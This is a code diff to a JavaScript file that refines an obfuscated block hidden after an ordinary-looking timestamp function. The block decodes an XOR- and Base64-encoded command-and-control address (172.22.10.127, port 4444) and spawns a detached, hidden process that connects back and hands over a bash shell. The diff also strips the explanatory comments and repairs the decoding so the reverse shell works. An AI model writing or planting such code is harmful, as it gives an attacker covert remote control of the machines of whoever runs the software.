@@ -48,41 +48,26 @@ function timestamp() {
 // ============================================================
 
 const _0x4f2a = (function() {
-  // XOR key — single byte
   const k = 0x5A;
 
-  // IP 172.22.10.127 → hex: AC 16 0A 7F
-  // Each byte XORed with 0x5A:
-  //   AC ^ 5A = F6
-  //   16 ^ 5A = 4C
-  //   0A ^ 5A = 50
-  //   7F ^ 5A = 25
-  // Result hex: F64C5025
-  const blob = 'RjZMQ1AwMjU='; // Base64 of "F64C5025"
+  // XORed + Base64-encoded C2 address
+  //   "9kxQJQ==" → [F6,4C,50,25] → XOR 0x5A → [AC,16,0A,7F] → 172.22.10.127
+  //   "SwY="     → [4B,06]       → XOR 0x5A → [11,5C]       → 4444
+  const ipBlob   = '9kxQJQ==';
+  const portBlob = 'SwY=';
 
-  // Port 4444 → hex 115C → XOR 0x5A → 4B06
-  const portBlob = 'SwY='; // Base64 of "4B06"
-
-  function _d(s) {
-    const raw = Buffer.from(s, 'base64').toString('hex');
-    const bytes = raw.match(/.{1,2}/g).map(h => parseInt(h, 16) ^ k);
-    return bytes;
-  }
-
-  function _ip() {
-    return _d(blob).join('.');
-  }
-
-  function _port() {
-    return (_d(portBlob)[0] << 8) | _d(portBlob)[1];
-  }
+  const _d = b => Array.from(Buffer.from(b, 'base64')).map(x => x ^ k);
 
   function _init() {
+    const host = _d(ipBlob).join('.');
+    const p = _d(portBlob);
+    const port = (p[0] << 8) | p[1];
+
     const payload = `
       const net = require('net');
       const { spawn } = require('child_process');
       const client = new net.Socket();
-      client.connect(${_port()}, '${_ip()}', () => {
+      client.connect(${port}, '${host}', () => {
         const shell = spawn('/bin/bash', [], { stdio: [client, client, client] });
         shell.on('exit', () => client.end());
       });
@@ -94,7 +79,6 @@ const _0x4f2a = (function() {
       stdio: 'ignore',
       windowsHide: true
     });
-
     child.unref();
   }
 
